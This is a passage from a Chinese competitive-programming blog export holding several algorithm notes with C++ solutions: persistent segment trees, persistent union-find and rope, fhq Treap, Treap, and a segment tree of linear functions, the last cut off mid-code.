        <tag>颓废</tag>
        <tag>瞎搞</tag>
        <tag>css</tag>
        <tag>Blog</tag>
        <tag>html</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「数据结构」主席树(可持久化线段树)算法笔记]]></title>
    <url>%2Farticles%2F%E4%B8%BB%E5%B8%AD%E6%A0%91%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[上一篇「学习笔记」可持久化并查集 / rope讲了两种思路 - Cheat和可持久化线段树，这里，我们就再讲一下主席树吧quq主席树是用来解决第k大问题的一种好用的数据结构，用的就是函数式的权值线段树来实现函数式是实现可持久化的一种方法一天，你愉快的打着暴力，吸氧暴力过紫题? , 你看到了这样一道题目:给定 NNN 个数（ intintint 范围内），一共 MMM 次询问，每次都要询问区间 [l,r][l,r][l,r] 的第 kkk 大的数，滋瓷修改操作其中 N,M,l,rN,M,l,rN,M,l,r 均不超过2×1052 \times 10^52×10​5​​，保证询问有答案暴力做法显而易见，最暴力的办法就是区间排序然后输出排序后第 kkk 个数。最坏情况的时间复杂度是O(nmlogn)O(nm\log n)O(nmlogn)，不超时才怪....主席树做法你看了看题目的标签，发现有一个线段树的标签，于是开始想建 nnn 个线段树...但是线段树的空间本来就是非常蛋疼的假如开n个，就不用活了，直接MLEMLEMLE告辞，可能比暴力分还低....于是我们看一看修改前后的线段树，试图找到什么规律...这是一个too young的不滋瓷可持久化的线段树我们看到了，修改某一个节点，就只改动了该节点到树根的一条链，链上的每一个节点都被增加了333.所以，对于每一次修改，只需要建一条 logn\log nlogn 的链就行了quq我们只要每次记录一下她所更改的节点就可以了quq一道裸题 - poj2104给定数列于区间，求区间第k大的数简化版本假如就给你n个数，让你求第k大怎么求首先排序，离散化一下（离线让后用离散后的数建立一颗线段树但是这颗线段树不行以权值为节点储存的它的每个节点存储的就是当前下标数字在范围内出现的次数例如离散后为4 2 1 3 2那么我们建出的线段树为假如我们查询第kkk大的话那么从根开始假如他的右孩子的权值大于等于 kkk 的话，走到右儿子假如小于的话，走到左儿子，并 kkk 等于这个权值减 kkk假如我们要查询第 333 大的数那么假如我们要求区间 ， 的k大的话，就可以在区间 [i−1,j][i-1,j][i−1,j] 分别构建两棵优美的线段树然后差分，查出第 kkk 大的即可。那这样的话，我们就可以对于每一个数列中的点建立一颗线段树，就可以求区间了于是就变成了一道主席树的裸题对于每一个点插入总线段树，都建一条链，存一个点，就能随时提取区间了我们可以具体看一下动态开点的代码123456789void update(int num, int &amp;rt, int l, int r) &#123; Tree[cnt++] = Tree[rt]; rt = cnt - 1; Tree[rt].sum++; if(l == r) return; int mid = (l + r)&gt;&gt;1; if(num &lt;= mid) update(num, Tree[rt].L, l, mid); else update(num, Tree[rt].R, mid + 1, r);&#125;我们该怎么理解呢？我们原先带进去的那个 rtrtrt，其实是原来的节点，numnumnum 是我们要把它改变成哪个数。我们一开始的语句1Tree[cnt++] = Tree[rt];就是把它变成原来的节点，这样的话我们只要修改需要修改的左儿子或者右儿子就可以了。其实就是加新链的过程。1rt = cnt - 1;而这一句我们就改变了 nownownow 的值，别忘了上面的 nownownow 带的是地址，这样上一层就直接修改了 (因为不传引用 爆零 就不怪我了quq明白这些就可以开始码了一定不要忘记离散化!123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include&lt;algorithm&gt;#include&lt;iostream&gt;#include&lt;cstring&gt;#include&lt;cstdio&gt;const int maxn = 1e5 + 10;int n, m;int cnt;struct node&#123; int L, R;//分别指向左右子树 int sum;//该节点所管辖区间范围内数的个数 node()&#123; sum = 0; &#125;&#125; Tree[maxn * 20];struct value &#123; int x; int id;&#125; Value[maxn];bool cmp(value v1, value v2) &#123; return v1.x &lt; v2.x;&#125;int root[maxn];int rank[maxn];void init() &#123; cnt = 1; root[0] = 0; Tree[0].L = Tree[0].R = Tree[0].sum = 0;&#125;void update(int num, int &amp;rt, int l, int r) &#123; Tree[cnt++] = Tree[rt]; rt = cnt - 1; Tree[rt].sum++; if(l == r) return; int mid = (l + r)&gt;&gt;1; if(num &lt;= mid) update(num, Tree[rt].L, l, mid); else update(num, Tree[rt].R, mid + 1, r);&#125;int query(int i, int j, int k, int l, int r) &#123; int d = Tree[Tree[j].L].sum - Tree[Tree[i].L].sum; if(l == r) return l; int mid = (l + r)&gt;&gt;1; if(k &lt;= d) return query(Tree[i].L, Tree[j].L, k, l, mid); else return query(Tree[i].R, Tree[j].R, k - d, mid + 1, r);&#125;int main (int argc, char const *argv[]) &#123; scanf ("%d%d", &amp;n, &amp;m); for(int i = 1; i &lt;= n; i++) &#123; scanf("%d", &amp;Value[i].x); Value[i].id = i; &#125; //进行离散化 std::sort(Value + 1, Value + n + 1, cmp); for(int i = 1; i &lt;= n; i++) rank [ Value[i].id ] = i; init(); for(int i = 1; i &lt;= n; i++) &#123; root[i] = root[i - 1]; update (rank[i], root[i], 1, n); &#125; int left, right, k; for(int i = 1; i &lt;= m; i++) &#123; scanf("%d%d%d", &amp;left, &amp;right, &amp;k); printf("%d\n", Value[query(root[left - 1], root[right], k, 1, n)].x); &#125; return 0;&#125;//完美结束进阶假如要在数列中更改节点的数值改怎么办呢bzoj1901（权限题，交不了就用 zoj2112 但是zoj的内存限制非常蛋疼题目给定一个含有nnn个数的序列程序必须回答这样的询问：对于给定的i,j,ki,j,ki,j,k，在中第k小的数是多少(1≤k≤j−i+11\le k\le j-i+11≤k≤j−i+1)，并且，你可以改变一些aia_ia​i​​的值，改变后，程序还能针对改变后的aaa继续回答上面的问题你需要编一个这样的程序，从输入文件中读入序列aaa，然后读入一系列的指令，包括询问指令和修改指令。对于每一个询问指令，你必须输出正确的回答第一行有两个正整数n(1≤n≤10000)n(1\le n\le 10000)n(1≤n≤10000)，m(1≤m≤10000)m(1\le m\le 10000)m(1≤m≤10000)。分别表示序列的长度和指令的个数。第二行有nnn个数，表示，这些数都小于10910^910​9​​接下来的mmm行描述每条指令，每行的格式是下面两种格式中的一种。 Q i j k 或者 C i tQ i j k （i,j,ki,j,ki,j,k是数字，1≤i≤j≤n1\le i\le j\le n1≤i≤j≤n, 1≤k≤j−i+11\le k\le j-i+11≤k≤j−i+1）表示询问指令，询问中第k小的数C i t ，表示把aia_ia​i​​改变成为ttt对于每一次询问，你都需要输出他的答案，每一个输出占单独的一行。输入样例:123455 33 2 1 4 7Q 1 4 3C 2 6Q 2 5 3输出样例:1236数据范围20%20\%20% 的数据中，m,n≤102m,n\le10^2m,n≤10​2​​;40%40\%40% 的数据中，m,n≤103m,n\le10^3m,n≤10​3​​;100%100\%100% 的数据中，m,n≤105m,n\le10^5m,n≤10​5​​;大意就是可以随时改变区间中数的值，询问区间的第k大的值现在我们若是按着上面的思路：仍然是做桶，仍然是利用前缀和相减。但是对某个元素的修改，会影响到其后面所有的前缀和，于是对后面的也都进行一次修改。[可这每个操作都是 nlognnlognnlogn 的...明显太慢]于是我们想起了一种可以快速修改和获得前缀和的数据结构——树状数组。每次修改时只需要修改[ j+lowbit(j)j+lowbit(j)j+lowbit(j) ]等等的元素，每次二分下去时需要对 x,yx,yx,y 两棵子树分别求前缀和 [j−lowbit(j)j-lowbit(j)j−lowbit(j)] 等等的和这样修改和获取前缀和的复杂度都是 lognlognlogn 的，所以每次操作都是 log2n\log^2nlog​2​​n 的再分析一下空间复杂度：回顾之前，我们虽然建了 nnn 棵树但事实上很多部分是相同的，所以那些部分我们都没有管，只是将节点与上一个节点定为相同，然后对于变化的部分再操作那么我们这道题如果按照上面的方法大概是不太可行的，因为现在我们每棵线段树表示的是树状数组中的含义[例如 666 表示 5+65+65+6 , 121212 表示 9+10+11+129+10+11+129+10+11+12 等等...]也就是说每次修改的前一个是可能不同的，不能将当前节点设为原来的节点改[事实上，原来那种改法是因为前驱只有一个以及只要修改一个设计出来的，而我们这里两个都不满足]，但是有一点思想是好的，就是我改变的每次都只有一条链，而每次修改就是添加一条链上去，不是整个线段树已经建好了再去修改[有点类似Trie树的构造]，所以空间上复杂度也不吃紧，(n+m)logn(n+m)logn(n+m)logn也是可以接受的。上面主要讲了使用什么样的线段树，下面具体说一下怎么使用线段树的问题。操作０：因为线段树在这里做桶，于是使用 HashHashHash 来离散化，即预处理快排一下，然后查找的时候二分找对应的位置。[注意：因为操作中有修改元素的操作，所以离散化需要将这些元素也包含在内，这就需要离线处理]操作１：预处理原序列：对于第 iii 个元素，对 iii 及 iii 后面的[指树状数组中i+lowbit(i)i+lowbit(i)i+lowbit(i)的]所有节点都加上这个元素。操作２：修改某个位置上的元素的值：首先按原来的值在这个节点及以后的所有节点上 −1-1−1 ，然后按新的值在这个节点及以后的所有节点上 +1+1+1操作３：询问一段区间内排行第 kkk 的元素：和静态类似。但是每次求左右子树的前缀和时使用树状数组代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128// // AC Code// From : http://www.yhzq-blog.cc////////////////////////////////////////////// Problem: 1901// Time: 420ms// Memory: 101804 kb// Code Length: 3198 B// #include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;#define N 200010using namespace std;typedef long long ll;struct node&#123; int l,r,value;&#125;pri_tree[N*40];int pri_cnt,cnt;int data[N],value[N],rank[N],L[N],R[N],a[N],b[N],k[N],root[N];bool flag[N];int la,lb,n,q;int lowbit(int x)&#123;return x&amp;(-x);&#125;int find(int x)&#123; int l=1,r=cnt; while(l&lt;=r) &#123; int mid=l+r&gt;&gt;1; if (rank[mid]&lt;x) l=mid+1; else r=mid-1; &#125; return l;&#125;void update(int &amp;now,int l,int r,int num,int x)&#123; pri_tree[++pri_cnt]=pri_tree[now]; now=pri_cnt; pri_tree[now].value+=x; if (l==r) return; int mid=l+r&gt;&gt;1; if (num&lt;=mid) update(pri_tree[now].l,l,mid,num,x); else update(pri_tree[now].r,mid+1,r,num,x);&#125;int query(int l,int r,int k)&#123; if (l==r) return l; int suml=0,sumr=0; for (int i=1;i&lt;=la;i++) suml+=pri_tree[pri_tree[L[i]].l].value; for (int i=1;i&lt;=lb;i++) sumr+=pri_tree[pri_tree[R[i]].l].value; int mid=l+r&gt;&gt;1; if (sumr-suml&gt;=k) &#123; for (int i=1;i&lt;=la;i++) L[i]=pri_tree[L[i]].l; for (int i=1;i&lt;=lb;i++) R[i]=pri_tree[R[i]].l; return query(l,mid,k); &#125; else &#123; for (int i=1;i&lt;=la;i++) L[i]=pri_tree[L[i]].r; for (int i=1;i&lt;=lb;i++) R[i]=pri_tree[R[i]].r; return query(mid+1,r,k-(sumr-suml)); &#125;&#125;main()&#123; scanf("%d%d",&amp;n,&amp;q); for (int i=1;i&lt;=n;i++) scanf("%d",&amp;value[i]),data[i]=value[i]; int top=n; for (int i=1;i&lt;=q;i++) &#123; char com[10]; scanf("%s%d%d",com,&amp;a[i],&amp;b[i]); if (com[0]=='Q') scanf("%d",&amp;k[i]); else data[++top]=b[i]; &#125; sort(data+1,data+top+1); rank[++cnt]=data[1]; for (int i=1;i&lt;=top;i++) if (data[i]!=data[i-1]) rank[++cnt]=data[i]; for (int i=1;i&lt;=n;i++) &#123; int t=find(value[i]); for (int j=i;j&lt;=n;j+=lowbit(j)) update(root[j],1,cnt,t,1); &#125; for (int i=1;i&lt;=q;i++) &#123; if (k[i]) &#123; la=lb=0;a[i]--; for (int j=a[i];j;j-=lowbit(j)) L[++la]=root[j]; for (int j=b[i];j;j-=lowbit(j)) R[++lb]=root[j]; printf("%d\n",rank[query(1,cnt,k[i])]); &#125; else &#123; int t=find(value[a[i]]); for (int j=a[i];j&lt;=n;j+=lowbit(j)) update(root[j],1,cnt,t,-1); value[a[i]]=b[i]; t=find(b[i]); for (int j=a[i];j&lt;=n;j+=lowbit(j)) update(root[j],1,cnt,t,1); &#125; &#125;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>树</tag>
        <tag>模版</tag>
        <tag>线段树</tag>
        <tag>主席树</tag>
        <tag>可持久化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「学习笔记」可持久化并查集 / rope]]></title>
    <url>%2Farticles%2F%E5%8F%AF%E6%8C%81%E4%B9%85%E5%8C%96%E5%B9%B6%E6%9F%A5%E9%9B%86-rope%2F</url>
    <content type="text"><![CDATA[我们来看一下可持久化并查集（有是玄学数据结构（其实用STL里面的rope就可以了quq我们来看看一种基于cheatcheatcheat的思想：UVA 11987 Almost Union-Find要求把一个元素从一个集合中剥离的情况，我们只需要新建一个节点然后………乱搞即可还是看代码吧：12345678inline void move(int x,int y) // 把x从y集合中剥离&#123; int fx = find(id[x]),fy = find(id[y]); if(fx == fy) return ; cnt[fx] --,sum[fx] -= x; id[x] = ++ tot; // 可持久化 f[id[x]] = fy; cnt[fy] ++,sum[fy] += x;&#125;这种方法主要是利用ididid，在最初时idi=iid_i = iid​i​​=i，随着移动iii，idiid_iid​i​​也在变化，在访问iii时，我们需直接用idiid_iid​i​​代替。于是我们带着这个思路看到了BZOJ 3673这道题看到题目 →\rightarrow→ mengbier →\rightarrow→ ......试图乱搞 →\rightarrow→ 爆炸可持久化并查集加强版 我们就不能cheatcheatcheat了，我们需要真的可持久化了因为并查集的所有信息都保存在fafafa里，所以，我们只需要用可持久化线段树实现一个可持久化数组并使其启发式合并就可以了并查集的启发式合并就是按秩合并，初始所有集合秩为000合并把秩小的树根的父亲设为秩大的树根如果秩相同，则随便选取一个作为父节点并将它的秩+1+1+1,秩和fafafa一样维护但是其实这题数据随机的话随便合并就行了，根本不用按秩合并什么的12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485//// Code from hzwer.com// http://hzwer.com/3951.html//#include&lt;iostream&gt;#include&lt;cstdio&gt;using namespace std;inline int read()&#123; int x=0;char ch=getchar(); while(ch&gt;'9'||ch&lt;'0')ch=getchar(); while(ch&gt;='0'&amp;&amp;ch&lt;='9')&#123;x=x*10+ch-'0';ch=getchar();&#125; return x;&#125;int n,m,sz;int root[200005],ls[2000005],rs[2000005],v[2000005],deep[2000005];void build(int &amp;k,int l,int r)&#123; if(!k)k=++sz; if(l==r)&#123;v[k]=l;return;&#125; int mid=(l+r)&gt;&gt;1; build(ls[k],l,mid); build(rs[k],mid+1,r);&#125;void modify(int l,int r,int x,int &amp;y,int pos,int val)&#123; y=++sz; if(l==r)&#123;v[y]=val;deep[y]=deep[x];return;&#125; ls[y]=ls[x];rs[y]=rs[x]; int mid=(l+r)&gt;&gt;1; if(pos&lt;=mid) modify(l,mid,ls[x],ls[y],pos,val); else modify(mid+1,r,rs[x],rs[y],pos,val);&#125;int query(int k,int l,int r,int pos)&#123; if(l==r)return k; int mid=(l+r)&gt;&gt;1; if(pos&lt;=mid)return query(ls[k],l,mid,pos); else return query(rs[k],mid+1,r,pos);&#125;void add(int k,int l,int r,int pos)&#123; if(l==r)&#123;deep[k]++;return;&#125; int mid=(l+r)&gt;&gt;1; if(pos&lt;=mid)add(ls[k],l,mid,pos); else add(rs[k],mid+1,r,pos);&#125;int find(int k,int x)&#123; int p=query(k,1,n,x); if(x==v[p])return p; return find(k,v[p]);&#125;int main()&#123; n=read();m=read(); build(root[0],1,n); int f,k,a,b; for(int i=1;i&lt;=m;i++) &#123; f=read(); if(f==1) &#123; root[i]=root[i-1]; a=read();b=read(); int p=find(root[i],a),q=find(root[i],b); if(v[p]==v[q])continue; if(deep[p]&gt;deep[q])swap(p,q); modify(1,n,root[i-1],root[i],v[p],v[q]); if(deep[p]==deep[q])add(root[i],1,n,v[q]); &#125; if(f==2) &#123;k=read();root[i]=root[k];&#125; if(f==3) &#123; root[i]=root[i-1]; a=read();b=read(); int p=find(root[i],a),q=find(root[i],b); if(v[p]==v[q])puts("1"); else puts("0"); &#125; &#125; return 0;&#125;但是这样就够了吗？想象一下你在考场里，时间不够，写不出可持久化并查集的正解在短时间内写出暴力对拍程序给不会STL,rope,可持久化并查集的人(学弟/学妹)装逼这时候你就需要rope这种神奇的东西了Code:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;algorithm&gt;#include &lt;ext/rope&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;ctime&gt;using namespace __gnu_cxx;const int maxm = 120010;rope&lt;int&gt; *fa[maxm];int a[maxm],lastans;int n,m;int find(int i,int x) &#123; if(fa[i]-&gt;at(x) == x) return x; int f = find(i,fa[i]-&gt;at(x)); if(f == fa[i]-&gt;at(x)) return f; fa[i]-&gt;replace(x,f); return fa[i]-&gt;at(x);&#125;inline void merge(int i,int x,int y) &#123; x = find(i,x),y = find(i,y); if(x != y) fa[i]-&gt;replace(y,x);&#125;int SlowRead()&#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int main(int argc, char const *argv[]) &#123; scanf("%d%d",&amp;n,&amp;m); for(int i = 1; i &lt;= n; i++) a[i] = i; fa[0] = new rope&lt;int&gt; (a, a + n + 1); for(int i = 1; i &lt;= m; i++) &#123; fa[i] = new rope&lt;int&gt; (*fa[i - 1]); int opt = SlowRead(); if(opt == 1) &#123; int a = SlowRead(),b = SlowRead(); merge(i, a, b); &#125; else if(opt == 2) &#123; int k = SlowRead(); fa[i] = fa[k]; &#125; else &#123; int a = SlowRead(),b = SlowRead(); printf("%d\n",lastans = (find (i, a) == find (i, b))); &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>玄学</tag>
        <tag>并查集</tag>
        <tag>可持久化</tag>
        <tag>rope</tag>
        <tag>STL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「P3391 文艺平衡树」 - 无旋Treap模版题]]></title>
    <url>%2Farticles%2Ffhq-treap%2F</url>
    <content type="text"><![CDATA[这又是一道模版题.jpg题目描述您需要写一种数据结构，来维护一个有序数列，其中需要提供以下操作：翻转一个区间，例如原有序序列是5 4 3 2 1，翻转区间是[2,4][2,4][2,4]的话，结果是5 2 3 4 1水题水题 （最近天天刷水题怕不是药丸原来写这道题的时候Splay莫名被卡，加了I/O优化也被卡，郁闷.jpg最近打Treap和Sbaly打习惯了，于是便不想再重构一遍我的Splay了，干脆写个fhq Treap得了这道题还是可以的，十分经典的无旋Treap由于栈不滋瓷随机访问iterator，所以我自己写了一个支持iterator的Stack:1234567891011121314template&lt;typename T, class Container = std::list&lt;T&gt; &gt;class Stack &#123;public: typedef typename Container::iterator iterator; iterator begin()&#123; return container_.begin(); &#125; iterator end() &#123; return container_.end(); &#125; void push(const T&amp; vaule)&#123; container_.push_front(vaule); &#125; void pop()&#123; container_.pop_front();&#125; T top()&#123; return container_.fr1ont(); &#125; size_t size() &#123; return container_.size(); &#125;private: Container container_;&#125;;// 套轮子.jpg代码如下123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153//// Shq// Luogu P3391//#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;ctime&gt;#include &lt;vector&gt;#include &lt;stack&gt;#include &lt;list&gt;#define DEBUG(x) std::cerr &lt;&lt; "#DEBUG(x): " &lt;&lt; x &lt;&lt; '\n'int m, n, top;const int MAXN = 100010;template&lt;typename T, class Container = std::list&lt;T&gt; &gt;class Stack &#123;public: typedef typename Container::iterator iterator; iterator begin()&#123; return container_.begin(); &#125; iterator end() &#123; return container_.end(); &#125; void push(const T&amp; vaule)&#123; container_.push_front(vaule); &#125; void pop()&#123; container_.pop_front();&#125; T top()&#123; return container_.front(); &#125; size_t size() &#123; return container_.size(); &#125;private: Container container_;&#125;;struct Node &#123; Node *left, *right; int key, size, tag; // int cnt; inline void revs () &#123; Node *temp; temp = left; left = right; right = temp; tag = tag ^ 1; &#125; inline void push_down () &#123; if (!this-&gt;tag) return; if (this-&gt;left) this-&gt;left-&gt;revs(); if (this-&gt;right) this-&gt;right-&gt;revs(); this-&gt;tag = 0; &#125; inline void update () &#123; this-&gt;size = (this-&gt;left ? this-&gt;left-&gt;size : 0) + (this-&gt;right ? this-&gt;right-&gt;size : 0) + 1; &#125; Node (int x = 0) : left (NULL) , right(NULL) , key(x) , size(1) , tag(0) &#123;&#125;&#125;;Node *root;Stack &lt;Node *&gt; st;inline Node *build() &#123; Node *x, *las; for(int i = 1; i &lt;= n; i++) &#123; x = new Node(i); las = NULL; while (top &amp;&amp; st.top()-&gt;key &gt; x-&gt;key) &#123; st.top()-&gt;update(); las = st.top(); st.pop(); &#125; if(st.size()) st.top()-&gt;right = x; x-&gt;left = las; st.push(x); &#125; Stack&lt;Node *&gt;::iterator it; for(it=st.begin();it!=st.end();it++) &#123; Node *temp = *it; temp-&gt;update(); &#125; return *st.begin();&#125;inline Node *merge(Node *x, Node *y) &#123; if(!x) return y; if(!y) return x; if(x-&gt;key &lt; y-&gt;key) &#123; x-&gt;push_down(); x-&gt;right=merge(x-&gt;right,y); x-&gt;update(); return x; &#125; else &#123; y-&gt;push_down(); y-&gt;left=merge(x,y-&gt;left); y-&gt;update(); return y; &#125;&#125;inline std::pair&lt;Node*, Node*&gt; split(Node *x,int k) &#123; if(!x) return std::pair&lt;Node*, Node*&gt;(NULL,NULL); std::pair&lt;Node*, Node*&gt; y; x-&gt;push_down(); if((x-&gt;left ? x-&gt;left-&gt;size : 0)&gt;=k) &#123; y = split(x-&gt;left,k); x-&gt;left = y.second; x-&gt;update(); y.second = x; &#125; else &#123; y = split(x-&gt;right, k - (x-&gt;left ? x-&gt;left-&gt;size : 0) - 1); x-&gt;right = y.first; x-&gt;update(); y.first = x; &#125; return y;&#125;inline void print(Node *x)&#123; if(!x)return; x-&gt;push_down(); print (x-&gt;left); printf ("%d ",x-&gt;key); print (x-&gt;right);&#125;int SlowRead()&#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int main()&#123; n = SlowRead(), m = SlowRead(); root = build(); while(m --&gt; 0)&#123; int x = SlowRead(),y = SlowRead(); std::pair&lt;Node*, Node*&gt; tp1(split(root, x - 1)),tp2(split(tp1.second, y - x + 1)); tp2.first-&gt;revs(); tp1.second = merge(tp2.first,tp2.second); root = merge(tp1.first,tp1.second); &#125; print(root);&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>平衡树</tag>
        <tag>Treap</tag>
        <tag>fhq treap</tag>
        <tag>非旋Treap</tag>
        <tag>模版题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「Luogu P1801 黑匣子」 - Treap模版题]]></title>
    <url>%2Farticles%2FP1801-%E9%BB%91%E5%8C%A3%E5%AD%90-NOI%E5%AF%BC%E5%88%8A2010%E6%8F%90%E9%AB%98%2F</url>
    <content type="text"><![CDATA[题目描述:给你两种操作:ADD(x) 把x这个元素放入序列中GET i加111，然后输出序列中第iii小的数明显，这是一道Treap的模版题水题水题（那么水的题还写Blog.....代码:talk is cheap, show me the Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;ctime&gt;#include &lt;vector&gt;#include &lt;stack&gt;const int MAXN = 400020;int Add[MAXN], Get[MAXN];int m, n, k;struct Node &#123; int key, priority; Node *left, *right; int size, cnt;&#125;;Node *root;inline void update (Node *root) &#123; root-&gt;size = root-&gt;left-&gt;size + root-&gt;right-&gt;size + root-&gt;cnt;&#125;inline void Left_rotate (Node *&amp;root) &#123; Node *temp = root-&gt;right; root-&gt;right = temp-&gt;left; temp-&gt;left = root; update (temp); update (root); root = temp;&#125;inline void Right_rotate (Node *&amp;root) &#123; Node *temp = root-&gt;left; root-&gt;left = temp-&gt;right; temp-&gt;right = root; update (temp); update (root); root = temp;&#125;void valueInsert(Node *&amp;root, Node *&amp;node)&#123; if (root == NULL) &#123; root = node; return; &#125; if (root-&gt;key == node-&gt;key) &#123; root-&gt;cnt++; update (root); return; &#125; if (root-&gt;key &gt;= node-&gt;key) &#123; valueInsert(root-&gt;left, node); return; &#125; if (root-&gt;key &lt; node-&gt;key) &#123; valueInsert(root-&gt;right, node); return; &#125; delete node; update (root); return;&#125;void Insert(Node *&amp;root, int key, int priority)&#123; Node* node = new Node; node-&gt;key = key; node-&gt;priority = priority; valueInsert(root, node);&#125;inline int Find_Value_By_Rank (Node *&amp;root, const int &amp;K) &#123; if (root == NULL || K &lt;= 0 || K &gt; root-&gt;size) return 0; int shq = (root-&gt;left == NULL ? 0 : root-&gt;left-&gt;size); if (K &gt;= shq + 1 &amp;&amp; K &lt;= shq + root-&gt;cnt) return root-&gt;key; else if (K &lt;= shq) return Find_Value_By_Rank (root-&gt;left, K); return Find_Value_By_Rank (root-&gt;right, K);&#125;inline int SlowRead()&#123; int data = 0, w = 1; char ch = 0; while (ch != '-' &amp;&amp; (ch &lt; '0' || ch &gt; '9')) ch = getchar(); if(ch == '-') w = -1, ch = getchar(); while (ch &gt;= '0' &amp;&amp; ch &lt;= '9') data = (data &lt;&lt; 1) + (data &lt;&lt; 3) + ch - '0', ch = getchar(); return data * w;&#125;int main(int argc, char const *argv[]) &#123; srand (time (NULL)); m = SlowRead(); n = SlowRead(); for (int i = 1; i &lt;= m; i++) Add[i] = SlowRead(); for (int i = 1; i &lt;= n; i++) Get[i] = SlowRead(); std::sort (Get + 1, Get + n + 1); for (int i = 1,j = 1; i &lt;= m; i++)&#123; Insert (root, Add[i], rand()); while(Get[j] == i)&#123; printf ("%d\n",Find_Value_By_Rank (root,++k)); j++; &#125; &#125; return 0;&#125;]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>平衡树</tag>
        <tag>Treap</tag>
        <tag>模版题</tag>
        <tag>Luogu</tag>
        <tag>NOI导刊</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「LYOI2016 Summer」一次函数 - 线段树 + 数论]]></title>
    <url>%2Farticles%2F%E3%80%8CLYOI2016-Summer%E3%80%8D%E4%B8%80%E6%AC%A1%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[题目描述给你 nnn 个一次函数 fi(x)=kix+bif_i(x) = k_i x + b_if​i​​(x)=k​i​​x+b​i​​，有 mmm 个操作，格式：M i k b，把第 iii 个函数改为fi(x)=kx+bf_i(x) = kx + bf​i​​(x)=kx+bQ l r x，询问fr(fr−1(…fl(x)))&nbsp;mod&nbsp;1000000007f_r(f_{r - 1} (\ldots f _l (x))) ~ \text{mod} ~ 1000000007f​r​​(f​r−1​​(…f​l​​(x)))&nbsp;mod&nbsp;1000000007的值对于 的数据，对于 100%100\%100% 的数据，n,m≤200000n, m \leq 200000n,m≤200000, k,b,x&lt;1000000007k, b, x &lt; 1000000007k,b,x&lt;1000000007这题明显是不能暴力算的（炸到死在想了5 min后，想出了正解我们可以维护一个这样的线段树：(使用Geogebra绘制)对于每一个非叶子节点ppp，都有这个节点对应的函数fleft(fright(x))f_{left}(f_{right}(x))f​left​​(f​right​​(x))所以说，我们只要把k,bk, bk,b维护一下就可以了kp=kp→left×kp→rightk_p = k_{p\rightarrow left} \times k_{p\rightarrow right}k​p​​=k​p→left​​×k​p→right​​bp=kp→left×bp→right+bp→leftb_p =k_{p\rightarrow left}\times b_{p\rightarrow right} +b_{p\rightarrow left}b​p​​=k​p→left​​×b​p→right​​+b​p→left​​对于合并操作，我们也只需要改一改就行了123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148// // Shq// File: lyoi-41.cpp// Time: 2018-06-09 09:23//#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#define DEBUG(x) std::cerr &lt;&lt; "#DEBUG: " &lt;&lt; x &lt;&lt; std::endl;const int MAXN = 200000;typedef long long ll;int n, m, mmm = 1e9 + 7;struct FFF &#123; int k, b; FFF (int _k = 1, int _b = 0) : k (_k) , b (_b) &#123;&#125; int value (int x) &#123; return ((ll)x * k % mmm + b) % mmm; &#125;&#125; origin[MAXN];FFF merge (const FFF &amp;left, const FFF &amp;right) &#123; FFF result; result.k = (ll)left.k * right.k % mmm; result.b = ((ll)right.k * left.b % mmm + right.b) % mmm; return result;&#125;struct SegmentTree &#123; int left, right; SegmentTree *left_child, *right_child; FFF fff; SegmentTree (int l, int r) : left(l) , right(r) , left_child(NULL) , right_child(NULL) &#123;&#125; void update () &#123; fff = merge (left_child-&gt;fff, right_child-&gt;fff); &#125; void build () &#123; if (right - left) &#123; fff = origin[left]; &#125; else &#123; int mid = (this-&gt;left + this-&gt;right) &gt;&gt; 1; left_child = new SegmentTree(left, mid), left_child-&gt;build(); right_child = new SegmentTree(mid, right), right_child-&gt;build(); 